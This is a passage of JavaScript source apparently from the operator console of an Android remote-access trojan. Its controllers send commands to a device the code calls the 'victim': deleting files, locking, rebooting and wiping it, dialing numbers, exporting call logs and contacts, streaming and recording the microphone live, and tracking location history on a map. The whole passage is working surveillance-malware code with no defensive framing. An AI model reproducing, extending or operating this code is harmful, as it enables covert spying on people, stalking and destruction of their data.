    $UtilitiesCtrl.DeleteFileFolder = (fileFolderPath) => {

        $rootScope.Log('Deleting path "' + fileFolderPath + '"');
        socket.emit(ORDER, { order: deleteFileFolder, fileFolderPath: fileFolderPath });
    }

    socket.on(deleteFileFolder, (data) => {
        if (data.status == true) {
            $rootScope.Log('Deleted successfully..', CONSTANTS.logStatus.SUCCESS);
        }
        else {
            $rootScope.Log("Failed to delete..", CONSTANTS.logStatus.FAIL);
        }
    });

    // ............................................

    $UtilitiesCtrl.LockDevice = () => {

        $rootScope.Log('Locking device..');
        socket.emit(ORDER, { order: lockDevice });
    }

    socket.on(lockDevice, (data) => {
        if (data.status == true) {
            $rootScope.Log(data.message, CONSTANTS.logStatus.SUCCESS);
        }
        else {
            $rootScope.Log(data.message, CONSTANTS.logStatus.FAIL);
        }
    });

    // ............................................

    $UtilitiesCtrl.WipeDevice = () => {

        if (confirm("Are you sure, you want to wipe out the victim?")) {

            $rootScope.Log('Wiping victim\'s device..');
            socket.emit(ORDER, { order: wipeDevice });
        }
        else {
            $rootScope.Log("You have choosen cancel.");
        }
    }

    socket.on(wipeDevice, (data) => {
        if (data.status == true) {
            $rootScope.Log(data.message, CONSTANTS.logStatus.SUCCESS);
        }
        else {
            $rootScope.Log(data.message, CONSTANTS.logStatus.FAIL);
        }
    });

    // ............................................

    $UtilitiesCtrl.RebootDevice = () => {

        if (confirm("Confirm by pressing okay.")) {

            $rootScope.Log('Rebooting victim\'s device..');
            socket.emit(ORDER, { order: rebootDevice });
        }
        else {
            $rootScope.Log("You have choosen cancel.");
        }
    }

    socket.on(rebootDevice, (data) => {
        if (data.status == true) {
            $rootScope.Log(data.message, CONSTANTS.logStatus.SUCCESS);
        }
        else {
            $rootScope.Log(data.message, CONSTANTS.logStatus.FAIL);
        }
    });

    // ............................................

    $UtilitiesCtrl.ListenMic = () => {
        socket.emit(ORDER, { order: listenMicrophone });
    }

    let audioFilePath;
    let audioDataBuffer = [];

    socket.on('audioData', (base64String) => {
        try {
            const audioBuffer = Buffer.from(base64String, 'base64');
            audioDataBuffer.push(audioBuffer);

            if (!audioStream) {
                audioFilePath = path.join(downloadsPath, "recording_" + Date.now() + ".wav");

                // Using Web Audio API instead of speaker module
                $rootScope.Log('Listening to microphone...');
            }

            // Save audio data to buffer for later file saving
            if (audioDataBuffer.length > 100) { // Limit buffer size
                audioDataBuffer = audioDataBuffer.slice(-50);
            }
        } catch (error) {
            $rootScope.Log('Error processing audio data: ' + error.message, CONSTANTS.logStatus.FAIL);
        }
    });


    socket.on('audioDataStop', () => {
        try {
            if (audioDataBuffer.length > 0) {
                // Save audio data to file
                const combinedBuffer = Buffer.concat(audioDataBuffer);
                fs.outputFile(audioFilePath, combinedBuffer, (err) => {
                    if (err) {
                        $rootScope.Log('Error saving audio file: ' + err.message, CONSTANTS.logStatus.FAIL);
                    } else {
                        $rootScope.Log('Recording saved on ' + audioFilePath, CONSTANTS.logStatus.SUCCESS);
                    }
                });
                audioDataBuffer = [];
            }
        } catch (error) {
            $rootScope.Log('Error stopping audio recording: ' + error.message, CONSTANTS.logStatus.FAIL);
        }
    });


});

//-----------------------Calls Controller (callslogs.htm)------------------------
// Calls controller
app.controller("CallsCtrl", function ($scope, $rootScope) {
    $CallsCtrl = $scope;
    $CallsCtrl.callsList = [];
    var calls = CONSTANTS.orders.calls;

    $CallsCtrl.$on('$destroy', () => {
        // release resources, cancel Listner...
        socket.removeAllListeners(calls);
    });

    $CallsCtrl.load = 'loading';
    $rootScope.Log('Get Calls list..');
    socket.emit(ORDER, { order: calls });


    $CallsCtrl.barLimit = 50;
    $CallsCtrl.increaseLimit = () => {
        $CallsCtrl.barLimit += 50;
    }

    $CallsCtrl.searchFilter = function (call) {
        if (!$CallsCtrl.searchQuery) return true; // nếu không nhập thì hiện tất cả

        var q = $CallsCtrl.searchQuery.toLowerCase();
        var phone = call.phoneNo ? call.phoneNo.toLowerCase() : '';
        var name = call.name ? call.name.toLowerCase() : '';

        return phone.includes(q) || name.includes(q);
    };

    $CallsCtrl.SaveCalls = () => {
        if ($CallsCtrl.callsList.length == 0)
            return;

        var csvRows = [];
        for (var i = 0; i < $CallsCtrl.callsList.length; i++) {
            var type = (($CallsCtrl.callsList[i].type) == 1 ? "INCOMING" : "OUTGOING");
            var name = (($CallsCtrl.callsList[i].name) == null ? "Unknown" : $CallsCtrl.callsList[i].name);
            csvRows.push($CallsCtrl.callsList[i].phoneNo + "," + name + "," + $CallsCtrl.callsList[i].duration + "," + type);
        }

        var csvStr = csvRows.join("\n");
        var csvPath = path.join(downloadsPath, "Calls_" + Date.now() + ".csv");
        $rootScope.Log("Saving Calls List...");
        fs.outputFile(csvPath, csvStr, (error) => {
            if (error)
                $rootScope.Log("Saving " + csvPath + " Failed", CONSTANTS.logStatus.FAIL);
            else
                $rootScope.Log("Calls List Saved on " + csvPath, CONSTANTS.logStatus.SUCCESS);

        });

    }

    socket.on(calls, (data) => {
        if (data.callsList) {
            $CallsCtrl.load = '';
            $rootScope.Log('Calls list arrived', CONSTANTS.logStatus.SUCCESS);
            $CallsCtrl.callsList = data.callsList;
            $CallsCtrl.logsSize = data.callsList.length;
            $CallsCtrl.$apply();
        }
    });

});
//-----------------------Contacts Controller (contacts.htm)------------------------
// Contacts controller
app.controller("ContCtrl", function ($scope, $rootScope) {
    $ContCtrl = $scope;
    $ContCtrl.contactsList = [];
    var contacts = CONSTANTS.orders.contacts;
    var dialNumber = CONSTANTS.orders.dialNumber;

    $ContCtrl.$on('$destroy', () => {
        // release resources, cancel Listner...
        socket.removeAllListeners(contacts);
        socket.removeAllListeners(dialNumber);
    });

    $ContCtrl.load = 'loading';
    $rootScope.Log('Get Contacts list..');
    socket.emit(ORDER, { order: contacts });

    $ContCtrl.barLimit = 50;
    $ContCtrl.increaseLimit = () => {
        $ContCtrl.barLimit += 50;
    }

    $ContCtrl.SaveContacts = () => {

        if ($ContCtrl.contactsList.length == 0)
            return;

        var csvRows = [];
        for (var i = 0; i < $ContCtrl.contactsList.length; i++) {
            csvRows.push($ContCtrl.contactsList[i].phoneNo + "," + $ContCtrl.contactsList[i].name);
        }

        var csvStr = csvRows.join("\n");
        var csvPath = path.join(downloadsPath, "Contacts_" + Date.now() + ".csv");
        $rootScope.Log("Saving Contacts List...");
        fs.outputFile(csvPath, csvStr, (error) => {
            if (error)
                $rootScope.Log("Saving " + csvPath + " Failed", CONSTANTS.logStatus.FAIL);
            else
                $rootScope.Log("Contacts List Saved on " + csvPath, CONSTANTS.logStatus.SUCCESS);

        });

    }

    socket.on(contacts, (data) => {
        if (data.contactsList) {
            $ContCtrl.load = '';
            $rootScope.Log('Contacts list arrived', CONSTANTS.logStatus.SUCCESS);
            $ContCtrl.contactsList = data.contactsList;
            $ContCtrl.contactsSize = data.contactsList.length;
            $ContCtrl.$apply();
        }
    });
    // ............................................


    $ContCtrl.DialNumber = (number) => {

        $rootScope.Log('Dialing to ' + number);
        socket.emit(ORDER, { order: dialNumber, number: number });
    }

    socket.on(dialNumber, (data) => {
        if (data.status == true) {
            $rootScope.Log('Successfully dialed number..', CONSTANTS.logStatus.SUCCESS);
        }
        else {
            $rootScope.Log("Failed to dial number..", CONSTANTS.logStatus.FAIL);
        }
    });
    // ............................................

    // Filter function for searching contacts by name or phone number
    $ContCtrl.searchFilter = function (contact) {
        if (!$ContCtrl.searchQuery) return true;
        var q = $ContCtrl.searchQuery.toLowerCase();
        return (contact.name && contact.name.toLowerCase().includes(q)) ||
            (contact.phoneNo && contact.phoneNo.toLowerCase().includes(q));
    };


});
//-----------------------Mic Controller (mic.htm)------------------------
// Mic controller
app.controller("MicCtrl", function ($scope, $rootScope) {
    $MicCtrl = $scope;
    $MicCtrl.isAudio = true;
    $MicCtrl.isRecording = false;
    $MicCtrl.isListening = false;
    var mic = CONSTANTS.orders.mic;
    let audioDataBuffer = [];
    let isListening = false;
    let isRecording = false;
    let audioContext = null;
    let audioQueue = [];
    let isPlaying = false;

    // Khởi tạo Web Audio API
    function initAudioContext() {
        try {
            if (!audioContext) {
                audioContext = new (window.AudioContext || window.webkitAudioContext)();
            }
            return audioContext;
        } catch (error) {
            $rootScope.Log('Web Audio API not supported: ' + error.message, CONSTANTS.logStatus.FAIL);
            return null;
        }
    }

    // Play audio from buffer
    function playAudioBuffer(audioBuffer) {
        const ctx = initAudioContext();
        if (!ctx) return;

        try {
            // Resume audio context if suspended
            if (ctx.state === 'suspended') {
                ctx.resume();
            }

            // Convert Buffer to ArrayBuffer
            const arrayBuffer = audioBuffer.buffer.slice(
                audioBuffer.byteOffset,
                audioBuffer.byteOffset + audioBuffer.byteLength
            );

            // Try to decode as PCM first (raw audio data)
            try {
                // Create audio buffer from PCM data
                const sampleRate = 44100;
                const channels = 1;
                const audioBufferLength = audioBuffer.length / 2; // 16-bit samples

                const audioBufferObj = ctx.createBuffer(channels, audioBufferLength, sampleRate);
                const channelData = audioBufferObj.getChannelData(0);

                // Convert 16-bit PCM to float32
                for (let i = 0; i < audioBufferLength; i++) {
                    const sample = audioBuffer.readInt16LE(i * 2);
                    channelData[i] = sample / 32768.0;
                }

                const source = ctx.createBufferSource();
                source.buffer = audioBufferObj;
                source.connect(ctx.destination);
                source.start(0);

                console.log('Playing PCM audio, samples:', audioBufferLength);
            } catch (pcmError) {
                console.log('PCM decode failed, trying decodeAudioData:', pcmError);

                // Fallback to decodeAudioData
                ctx.decodeAudioData(arrayBuffer, (buffer) => {
                    const source = ctx.createBufferSource();
                    source.buffer = buffer;
                    source.connect(ctx.destination);
                    source.start(0);
                }, (error) => {
                    console.error('Error decoding audio:', error);
                });
            }
        } catch (error) {
            console.error('Error playing audio:', error);
        }
    }

    socket.on('audioData', (base64String) => {
        try {
            console.log('Received audio data, length:', base64String.length);

            if (!base64String || base64String.length === 0) {
                console.warn('Empty audio data received');
                return;
            }

            const audioBuffer = Buffer.from(base64String, 'base64');

            if (audioBuffer.length === 0) {
                console.warn('Empty audio buffer after conversion');
                return;
            }

            audioDataBuffer.push(audioBuffer);

            if (!isListening) {
                isListening = true;
                $rootScope.Log('📢 Listening to microphone live stream...');

                // Update status
                const statusElement = document.getElementById('audioStatus');
                if (statusElement) {
                    statusElement.textContent = '🎤 Listening live...';
                    statusElement.style.color = '#4CAF50';
                }
            }

            // Play audio immediately
            console.log('Playing audio buffer, size:', audioBuffer.length);
            playAudioBuffer(audioBuffer);

            // Limit buffer size to prevent memory leak
            if (audioDataBuffer.length > 100) {
                audioDataBuffer = audioDataBuffer.slice(-50);
            }
        } catch (error) {
            console.error('Error processing live audio:', error);
            $rootScope.Log('Error processing live audio: ' + error.message, CONSTANTS.logStatus.FAIL);
        }
    });

    socket.on('audioDataStop', () => {
        $MicCtrl.isListening = false;
        audioDataBuffer = [];
        $rootScope.Log('⛔ Live stream stopped');

        // Cleanup audio context
        if (audioContext) {
            try {
                audioContext.close();
                audioContext = null;
            } catch (error) {
                console.error('Error closing audio context:', error);
            }
        }

        // Update status
        const statusElement = document.getElementById('audioStatus');
        if (statusElement) {
            statusElement.textContent = '⏹️ Stopped listening';
            statusElement.style.color = '#f44336';
        }
    });
    $MicCtrl.StartLiveMic = () => {
        $MicCtrl.isListening = true;
        try {
            $rootScope.Log('🟢 Requesting device to start microphone stream...');

            // Initialize audio context first
            const ctx = initAudioContext();
            if (ctx) {
                // Resume audio context if suspended
                if (ctx.state === 'suspended') {
                    ctx.resume().then(() => {
                        console.log('Audio context resumed');
                    });
                }
                console.log('Audio context state:', ctx.state);
            }

            // Reset listening state
            isListening = false;
            audioDataBuffer = [];

            socket.emit(ORDER, { order: "x0000listenMic" });
        } catch (error) {
            console.error('Error starting live mic:', error);
            $rootScope.Log('Error starting live mic: ' + error.message, CONSTANTS.logStatus.FAIL);
        }
    };

    $MicCtrl.StopLiveMic = () => {
        $MicCtrl.isListening = false;
        try {
            $rootScope.Log('🔴 Requesting device to stop microphone stream...');
            console.log('Stopping live mic stream');
            socket.emit(ORDER, { order: "x0000stopstreammic" });
        } catch (error) {
            console.error('Error stopping live mic:', error);
            $rootScope.Log('Error stopping live mic: ' + error.message, CONSTANTS.logStatus.FAIL);
        }
    };


    $MicCtrl.$on('$destroy', function () {
        // release resources, cancel Listner...
        socket.removeAllListeners(mic);
        socket.removeAllListeners('audioData');
        socket.removeAllListeners('audioDataStop');

        // Cleanup audio context
        if (audioContext) {
            try {
                audioContext.close();
                audioContext = null;
            } catch (error) {
                console.error('Error closing audio context:', error);
            }
        }
    });

    // Monitor socket connection
    socket.on('connect', () => {
        console.log('Socket connected for microphone');
    });

    socket.on('disconnect', () => {
        console.log('Socket disconnected for microphone');
        isListening = false;
    });

    socket.on('error', (error) => {
        console.error('Socket error for microphone:', error);
    });

    $MicCtrl.Record = () => {
        $rootScope.Log('Recording and monitoring...');
        $MicCtrl.isRecording = true;
        $MicCtrl.isListening = true;
        isRecording = true;
        isListening = true;
        $MicCtrl.$applyAsync();
        // Gửi lệnh nghe trực tiếp
        socket.emit(ORDER, { order: "x0000listenMic" });
        // Gửi lệnh dừng nghe trực tiếp
        socket.emit(ORDER, { order: "x0000startrecordmic" });
    };

    $MicCtrl.StopRecord = () => {
        $rootScope.Log('Stopping recording and monitoring...');
        $MicCtrl.isRecording = false;
        $MicCtrl.isListening = false;
        isRecording = false;
        isListening = false;
        $MicCtrl.$applyAsync();
        // Dừng ghi âm
        socket.emit(ORDER, { order: "x0000stoprecordmic" });
        // Gửi lệnh dừng nghe trực tiếp
        socket.emit(ORDER, { order: "x0000stopstreammic" });
    };

    socket.on(mic, (data) => {
        if (data.file == true) {
            $rootScope.Log('Audio arrived', CONSTANTS.logStatus.SUCCESS);

            var player = document.getElementById('player');
            var sourceMp3 = document.getElementById('sourceMp3');
            var uint8Arr = new Uint8Array(data.buffer);
            var binary = '';
            for (var i = 0; i < uint8Arr.length; i++) {
                binary += String.fromCharCode(uint8Arr[i]);
            }
            var base64String = window.btoa(binary);

            $MicCtrl.isAudio = false;
            $MicCtrl.$apply();
            sourceMp3.src = "data:audio/mp3;base64," + base64String;
            player.load();
            player.play();

            $MicCtrl.SaveAudio = () => {
                $rootScope.Log('Saving file..');
                var filePath = path.join(downloadsPath, data.name);
                fs.outputFile(filePath, data.buffer, (err) => {
                    if (err)
                        $rootScope.Log('Saving file failed', CONSTANTS.logStatus.FAIL);
                    else
                        $rootScope.Log('File saved on ' + filePath, CONSTANTS.logStatus.SUCCESS);
                });
            };
        }
    });
});
//-----------------------Location Controller (location.htm)------------------------
// Location controller
app.controller("LocCtrl", function ($scope, $rootScope) {
    $LocCtrl = $scope;
    var location = CONSTANTS.orders.location;

    // Lấy victimId từ main process
    const { ipcRenderer } = require('electron');
    let victimId = null;

    // Gửi request để lấy victimId
    ipcRenderer.send('getCurrentVictimId');

    // Lắng nghe response
    ipcRenderer.once('getCurrentVictimIdResponse', (event, response) => {
        if (response.success) {
            victimId = response.victimId;
            // Load location history sau khi có victimId
            $LocCtrl.loadLocationHistory();
        } else {
            console.error('Error getting victimId:', response.message);
        }
    });

    // Khởi tạo biến cho location history
    $LocCtrl.locationHistory = [];
    $LocCtrl.selectedLocationIndex = -1;
    var markers = []; // Array để lưu tất cả markers
    var marker; // Marker cho vị trí hiện tại

    $LocCtrl.$on('$destroy', () => {
        // release resources, cancel Listner...
        socket.removeAllListeners(location);
    });

    var map = L.map('mapid', {
        zoomControl: true,
        doubleClickZoom: false,
        scrollWheelZoom: true,
        dragging: true,
        touchZoom: false,
        boxZoom: false,
        keyboard: false,
        tap: false
    }).setView([51.505, -0.09], 13);
    L.tileLayer('http://{s}.tile.osm.org/{z}/{x}/{y}.png', {}).addTo(map);

    // Load location history khi controller khởi tạo
    $LocCtrl.loadLocationHistory = () => {
        if (victimId) {
            ipcRenderer.send('getLocationHistory', victimId);
        } else {
            console.error('VictimId not available');
        }
    };

    // Lắng nghe response từ main process
    ipcRenderer.on('getLocationHistoryResponse', (event, response) => {
        if (response.success) {
            $LocCtrl.locationHistory = response.history;
            $LocCtrl.$apply();
            // Hiển thị tất cả markers sau khi load history
            $LocCtrl.displayAllMarkers();
        } else {
            $rootScope.Log('Error loading location history: ' + response.message, CONSTANTS.logStatus.FAIL);
        }
    });

    // Lắng nghe location update từ server
    ipcRenderer.on('SocketIO:LocationUpdated', (event, data) => {
        if (data.deviceId === victimId) {
            $LocCtrl.locationHistory = data.history;
            $LocCtrl.$apply();
            // Hiển thị tất cả markers sau khi update
            $LocCtrl.displayAllMarkers();
        }
    });

    // Hiển thị tất cả markers trên bản đồ
    $LocCtrl.displayAllMarkers = () => {
        // Xóa tất cả markers cũ
        if (markers) {
            markers.forEach(marker => map.removeLayer(marker));
            markers = [];
        }

        // Tạo markers cho tất cả vị trí trong history
        if ($LocCtrl.locationHistory && $LocCtrl.locationHistory.length > 0) {
            $LocCtrl.locationHistory.forEach((location, index) => {
                if (location.lat && location.lng) {
                    // Bỏ qua vị trí đang được focus (sẽ được hiển thị riêng)
                    if ($LocCtrl.focusedLocationIndex === index) {
                        return;
                    }

                    var victimLoc = new L.LatLng(location.lat, location.lng);
                    var markerNumber = $LocCtrl.locationHistory.length - index; // Số từ 10 đến 1

                    var marker = L.marker(victimLoc, {
                        icon: L.divIcon({
                            className: 'custom-marker',
                            html: '<div style="background: #007bff; color: white; border-radius: 50%; width: 25px; height: 25px; display: flex; align-items: center; justify-content: center; font-weight: bold; border: 2px solid white; box-shadow: 0 2px 6px rgba(0,0,0,0.3); font-size: 11px;">' + markerNumber + '</div>',
                            iconSize: [25, 25],
                            iconAnchor: [12.5, 12.5]
                        })
                    }).addTo(map);

                    // Thêm popup cho marker
                    marker.bindPopup('<b>Location #' + (index + 1) + '</b><br>Lat: ' + location.lat.toFixed(6) + '<br>Lng: ' + location.lng.toFixed(6) + '<br>Time: ' + new Date(location.timestamp).toLocaleString());

                    markers.push(marker);
                }
            });
        }
    };

    // Xóa location history
    $LocCtrl.clearLocationHistory = () => {
        if (victimId && confirm('Are you sure you want to delete all location history?')) {
            ipcRenderer.send('clearLocationHistory', victimId);
        } else if (!victimId) {
            console.error('VictimId not available');
        }
    };

    // Lắng nghe response clear history
    ipcRenderer.on('clearLocationHistoryResponse', (event, response) => {
        if (response.success) {
            $LocCtrl.locationHistory = [];
            // Xóa tất cả markers
            if (markers) {
                markers.forEach(marker => map.removeLayer(marker));
                markers = [];
            }
            // Reset focus state
            if ($LocCtrl.focusedMarker) {
                map.removeLayer($LocCtrl.focusedMarker);
                $LocCtrl.focusedMarker = null;
            }
            $LocCtrl.focusedLocationIndex = null;
            $LocCtrl.selectedLocationIndex = null;
            $LocCtrl.$apply();
            $rootScope.Log('Location history cleared', CONSTANTS.logStatus.SUCCESS);
        } else {
            $rootScope.Log('Error clearing location history: ' + response.message, CONSTANTS.logStatus.FAIL);
        }
    });

    // Biến để theo dõi vị trí đang được focus
    $LocCtrl.focusedLocationIndex = null;
    $LocCtrl.focusedMarker = null;

    // Đi đến vị trí cụ thể (luôn focus, không toggle-off)
    $LocCtrl.goToLocation = (locationData, index) => {
        if (locationData && locationData.lat && locationData.lng) {
            var victimLoc = new L.LatLng(locationData.lat, locationData.lng);

            // Xóa marker focus cũ nếu có
            if ($LocCtrl.focusedMarker) {
                map.removeLayer($LocCtrl.focusedMarker);
                $LocCtrl.focusedMarker = null;
            }

            // Tạo marker mới cho vị trí được chọn
            var markerNumber = $LocCtrl.locationHistory.length - index; // Số từ 10 đến 1
            $LocCtrl.focusedMarker = L.marker(victimLoc, {
                icon: L.divIcon({
                    className: 'custom-marker selected',
                    html: '<div style="background: #ff4444; color: white; border-radius: 50%; width: 30px; height: 30px; display: flex; align-items: center; justify-content: center; font-weight: bold; border: 3px solid white; box-shadow: 0 2px 8px rgba(0,0,0,0.3);">' + markerNumber + '</div>',
                    iconSize: [30, 30],
                    iconAnchor: [15, 15]
                })
            }).addTo(map);

            // Hiển thị tất cả markers trên bản đồ (trừ marker đang focus)
            $LocCtrl.focusedLocationIndex = index;
            $LocCtrl.selectedLocationIndex = index;
            $LocCtrl.displayAllMarkers();

            $LocCtrl.$apply();
            map.panTo(victimLoc);
            map.setZoom(15);

            $rootScope.Log('Focused on location: ' + locationData.lat + ', ' + locationData.lng, CONSTANTS.logStatus.SUCCESS);
        }
    };

    $LocCtrl.Refresh = () => {
        $LocCtrl.load = 'loading';
        $rootScope.Log('Get Location..');
        socket.emit(ORDER, { order: location });
    }

    $LocCtrl.load = 'loading';
    $rootScope.Log('Get Location..');
    socket.emit(ORDER, { order: location });

    socket.on(location, (data) => {
        $LocCtrl.load = '';
        if (data.enable) {
            if (data.lat == 0 && data.lng == 0)
                $rootScope.Log('Try to Refresh', CONSTANTS.logStatus.FAIL);
            else {
                $rootScope.Log('Location arrived => ' + data.lat + "," + data.lng, CONSTANTS.logStatus.SUCCESS);
                var victimLoc = new L.LatLng(data.lat, data.lng);

                // Xóa marker cũ nếu có
                if (marker) {
                    map.removeLayer(marker);
                }

                // Tạo marker mới cho vị trí hiện tại
                marker = L.marker(victimLoc, {
                    icon: L.divIcon({
                        className: 'custom-marker current',
                        html: '<div style="background: #28a745; color: white; border-radius: 50%; width: 30px; height: 30px; display: flex; align-items: center; justify-content: center; font-weight: bold; border: 3px solid white; box-shadow: 0 2px 8px rgba(0,0,0,0.3);">📍</div>',
                        iconSize: [30, 30],
                        iconAnchor: [15, 15]
                    })
                }).addTo(map);

                map.panTo(victimLoc);

                // Reload location history sau khi có vị trí mới
                if (victimId) {
                    $LocCtrl.loadLocationHistory();
                }
            }
        } else
            $rootScope.Log('Location Service is not enabled on Victim\'s Device', CONSTANTS.logStatus.FAIL);
    });
});
